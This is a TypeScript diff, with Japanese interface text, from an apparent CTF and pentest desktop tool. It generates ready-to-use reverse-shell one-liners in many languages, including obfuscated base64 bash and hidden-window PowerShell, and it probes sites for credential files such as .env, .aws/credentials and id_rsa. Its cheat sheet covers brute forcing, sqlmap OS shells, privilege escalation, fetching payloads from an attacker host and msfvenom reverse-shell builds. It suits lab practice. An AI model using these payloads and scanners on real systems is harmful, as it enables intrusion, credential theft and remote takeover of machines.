+          return String.fromCharCode(((c.charCodeAt(0) - a + 13) % 26) + a);
+        });
+      outEl.value = r;
+    } catch (e) {
+      outEl.value = `エラー: ${e}`;
+    }
+  });
+}
+
+function setupRevShellSub(): void {
+  const hostEl = document.getElementById("rs-host") as HTMLInputElement | null;
+  const portEl = document.getElementById("rs-port") as HTMLInputElement | null;
+  const shellEl = document.getElementById("rs-shell") as HTMLSelectElement | null;
+  const outEl = document.getElementById("rs-out") as HTMLPreElement | null;
+  if (!hostEl || !outEl) return;
+  function gen(): void {
+    const ip = hostEl!.value || "10.10.14.1";
+    const port = portEl?.value || "4444";
+    const sh = shellEl?.value || "/bin/bash";
+    const b64 = btoa(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
+    const psB64 = btoa(
+      `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+        .split("")
+        .map((c) => c + "\0")
+        .join(""),
+    );
+    const lines = [
+      `# === リスナー ===`,
+      `nc -lvnp ${port}`,
+      `rlwrap nc -lvnp ${port}    # 矢印キー使える版`,
+      ``,
+      `# === bash ===`,
+      `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+      `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
+      `# Base64 で難読化:`,
+      `echo ${b64} | base64 -d | bash`,
+      ``,
+      `# === sh / nc ===`,
+      `sh -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
+      `mkfifo /tmp/f; cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+      `nc ${ip} ${port} -e ${sh}                # 古い nc`,
+      `nc -c ${sh} ${ip} ${port}                # OpenBSD nc`,
+      ``,
+      `# === Python ===`,
+      `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
+      `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
+      ``,
+      `# === PHP ===`,
+      `php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`,
+      `php -r '$s=fsockopen("${ip}",${port});shell_exec("${sh} -i <&3 >&3 2>&3");'`,
+      ``,
+      `# === Perl ===`,
+      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`,
+      ``,
+      `# === Ruby ===`,
+      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
+      ``,
+      `# === Node.js ===`,
+      `node -e 'require("child_process").exec("nc -e ${sh} ${ip} ${port}")'`,
+      ``,
+      `# === PowerShell (Windows) ===`,
+      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+      `# Base64 (-EncodedCommand 用):`,
+      `powershell -nop -w hidden -e ${psB64}`,
+      ``,
+      `# === Java ===`,
+      `r = Runtime.getRuntime(); p = r.exec(["${sh}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();`,
+      ``,
+      `# === シェル安定化 (接続後 victim 側で実行) ===`,
+      `python3 -c 'import pty;pty.spawn("${sh}")'`,
+      `export TERM=xterm-256color`,
+      `Ctrl+Z   stty raw -echo;fg   reset`,
+    ];
+    outEl!.textContent = lines.join("\n");
+  }
+  hostEl.addEventListener("input", gen);
+  portEl?.addEventListener("input", gen);
+  shellEl?.addEventListener("change", gen);
+  gen();
+}
+
+function setupJwtSub(): void {
+  const inEl = document.getElementById("jwt-input") as HTMLTextAreaElement | null;
+  const runBtn = document.getElementById("jwt-run") as HTMLButtonElement | null;
+  const hEl = document.getElementById("jwt-header") as HTMLPreElement | null;
+  const pEl = document.getElementById("jwt-payload") as HTMLPreElement | null;
+  const sEl = document.getElementById("jwt-sig") as HTMLPreElement | null;
+  if (!runBtn || !inEl) return;
+  function b64urlDecode(s: string): string {
+    s = s.replace(/-/g, "+").replace(/_/g, "/");
+    while (s.length % 4) s += "=";
+    try {
+      return decodeURIComponent(escape(atob(s)));
+    } catch {
+      return atob(s);
+    }
+  }
+  function go(): void {
+    const t = inEl!.value.trim();
+    const parts = t.split(".");
+    if (parts.length < 2) {
+      if (hEl) hEl.textContent = "形式が JWT ではありません";
+      if (pEl) pEl.textContent = "";
+      if (sEl) sEl.textContent = "";
+      return;
+    }
+    try {
+      const h = JSON.parse(b64urlDecode(parts[0]));
+      const p = JSON.parse(b64urlDecode(parts[1]));
+      if (hEl) hEl.textContent = JSON.stringify(h, null, 2);
+      if (pEl) pEl.textContent = JSON.stringify(p, null, 2);
+      if (sEl) sEl.textContent = parts[2] || "(なし)";
+    } catch (e) {
+      if (hEl) hEl.textContent = `デコード失敗: ${e}`;
+    }
+  }
+  runBtn.addEventListener("click", go);
+  inEl.addEventListener("input", go);
+}
+
+function setupDnsSub(): void {
+  const hostEl = document.getElementById("dns-host") as HTMLInputElement | null;
+  const typeEl = document.getElementById("dns-type") as HTMLSelectElement | null;
+  const runBtn = document.getElementById("dns-run") as HTMLButtonElement | null;
+  const outEl = document.getElementById("dns-out") as HTMLPreElement | null;
+  if (!runBtn || !outEl) return;
+  runBtn.addEventListener("click", async () => {
+    const name = (hostEl?.value || "").trim();
+    if (!name) {
+      outEl.textContent = "ホスト名を入力";
+      return;
+    }
+    const type = typeEl?.value || "A";
+    outEl.textContent = "クエリ中…";
+    try {
+      const url = `https://dns.google/resolve?name=${encodeURIComponent(name)}&type=${type}`;
+      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
+        method: "GET",
+        url,
+        headers: [["Accept", "application/dns-json"]],
+        body: null,
+        timeoutMs: 10000,
+        followRedirects: true,
+      });
+      const data = JSON.parse(r.body);
+      const lines: string[] = [];
+      lines.push(`Query: ${name} (${type})`);
+      lines.push(`Status: ${data.Status} (0=NOERROR)`);
+      if (data.Answer) {
+        lines.push("─ Answer ─");
+        for (const a of data.Answer) {
+          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
+        }
+      }
+      if (data.Authority) {
+        lines.push("─ Authority ─");
+        for (const a of data.Authority) {
+          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
+        }
+      }
+      outEl.textContent = lines.join("\n");
+    } catch (e) {
+      outEl.textContent = `エラー: ${e}`;
+    }
+  });
+  function typeName(n: number): string {
+    return ({ 1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR", 15: "MX", 16: "TXT", 28: "AAAA", 33: "SRV" } as Record<number, string>)[n] || String(n);
+  }
+}
+
+function setupSensitiveFilesSub(): void {
+  const baseEl = document.getElementById("sf-base") as HTMLInputElement | null;
+  const runBtn = document.getElementById("sf-run") as HTMLButtonElement | null;
+  const outEl = document.getElementById("sf-out") as HTMLPreElement | null;
+  if (!runBtn || !outEl) return;
+  const PATHS = [
+    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".gitignore",
+    ".env", ".env.local", ".env.production", ".htaccess", ".htpasswd",
+    ".svn/entries", ".DS_Store", "config.php", "config.php.bak", "wp-config.php",
+    "wp-config.php.bak", "phpinfo.php", "info.php", "test.php", "server-status",
+    "server-info", ".well-known/security.txt", "crossdomain.xml",
+    "backup.zip", "backup.tar.gz", "db.sql", "dump.sql", "id_rsa", "composer.json",
+    "package.json", "Gemfile", ".aws/credentials", ".npmrc", ".bash_history",
+    "console", "actuator", "actuator/health", "actuator/env", "swagger.json",
+    "swagger-ui.html", "api/swagger", "api-docs", "graphql",
+  ];
+  runBtn.addEventListener("click", async () => {
+    const base = (baseEl?.value || "").trim().replace(/\/+$/, "");
+    if (!base) {
+      outEl.textContent = "ベースURL 必須";
+      return;
+    }
+    outEl.textContent = "";
+    for (const p of PATHS) {
+      const url = `${base}/${p}`;
+      try {
+        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
+          method: "GET",
+          url,
+          headers: [],
+          body: null,
+          timeoutMs: 5000,
+          followRedirects: false,
+        });
+        const interesting = r.status === 200 || r.status === 401 || r.status === 403;
+        const tag = interesting ? "⚠️" : "  ";
+        outEl.textContent += `${tag} [${r.status}] ${url}  (${r.bytes}B)\n`;
+        outEl.scrollTop = outEl.scrollHeight;
+      } catch {
+        outEl.textContent += `   [ERR] ${url}\n`;
+      }
+    }
+  });
+}
+
+const THM_CHEAT = `# === 偵察 ===
+nmap -sC -sV -oN nmap.log <IP>
+nmap -p- --min-rate 1000 <IP>          # 全 65535 ポート高速
+nmap -sU --top-ports 50 <IP>            # UDP top 50
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
+ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
+wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404 http://<IP>/FUZZ
+nikto -h http://<IP>
+whatweb http://<IP>
+
+# === SMB ===
+enum4linux -a <IP>
+smbclient -L //<IP> -N
+smbclient //<IP>/share -N
+smbmap -H <IP>
+
+# === ブルートフォース ===
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+hydra -L users.txt -P pass.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+hydra -l admin -P rockyou.txt <IP> ftp
+
+# === ハッシュ ===
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt        # MD5
+hashcat -m 1000 hash.txt rockyou.txt                          # NTLM
+hashcat -m 1600 '$apr1$...' rockyou.txt                       # APR1
+hashcat -m 1800 hash.txt rockyou.txt                          # SHA-512 crypt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+ssh2john id_rsa > hash; john hash --wordlist=rockyou.txt
+zip2john file.zip > hash
+rar2john file.rar > hash
+
+# === sqlmap ===
+sqlmap -u "http://<IP>/page?id=1" --dbs
+sqlmap -r req.txt -p username --dbs                     # Burp で保存した raw リクエスト
+sqlmap -r req.txt -p username --current-user
+sqlmap -r req.txt -D <db> --tables
+sqlmap -r req.txt -D <db> -T <tbl> --dump
+sqlmap -u "..." --os-shell
+
+# === リバースシェル ===
+nc -lvnp 4444                                             # リスナー
+bash -i >& /dev/tcp/<LHOST>/4444 0>&1
+python3 -c 'import pty;pty.spawn("/bin/bash")'           # PTY 安定化
+Ctrl+Z; stty raw -echo; fg; reset                        # フル端末
+
+# === 権限昇格 (Linux) ===
+sudo -l                                                    # 何が NOPASSWD で実行できるか
+find / -perm -u=s -type f 2>/dev/null                     # SUID
+find / -perm -4000 2>/dev/null
+find / -writable -type f 2>/dev/null
+getcap -r / 2>/dev/null                                    # capabilities
+cat /etc/crontab                                          # cron
+ls -la /etc/cron.*
+./linpeas.sh
+./LinEnum.sh
+# 配信:
+python3 -m http.server 8000             # 攻撃側
+wget http://<LHOST>:8000/linpeas.sh     # 被害側
+chmod +x linpeas.sh && ./linpeas.sh
+
+# === 権限昇格 (Windows) ===
+whoami /priv
+whoami /groups
+systeminfo
+.\\winPEASany.exe
+.\\PowerUp.ps1; Invoke-AllChecks
+
+# === GTFOBins (sudo / SUID 抜け道の代表) ===
+sudo systemctl ; sudo find / -exec /bin/sh \\;
+sudo vim -c ':!/bin/sh' ; sudo less file ; !sh
+SUID /bin/bash → /bin/bash -p
+
+# === ファイル転送 ===
+# 攻撃側:
+python3 -m http.server 80
+# 被害側:
+wget http://<LHOST>/file
+curl -O http://<LHOST>/file
+certutil -urlcache -f http://<LHOST>/file file.exe   # Windows
+
+# === MSF ===
+msfconsole
+search <name>
+use <id>; show options; set RHOSTS <IP>; run
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > sh.exe
+`;
+
+function setupPentestTool(): void {
+  setupPortScannerSub();
+  setupHttpReqSub();
+  setupDirBusterSub();
+  setupSqliSub();
+  setupHashIdSub();
+  setupHashGenSub();
+  setupEncodeSub();
+  setupRevShellSub();
+  setupJwtSub();
+  setupDnsSub();
+  setupSensitiveFilesSub();
+  const cheat = document.getElementById("thm-cheat");
+  if (cheat) cheat.textContent = THM_CHEAT;
 }
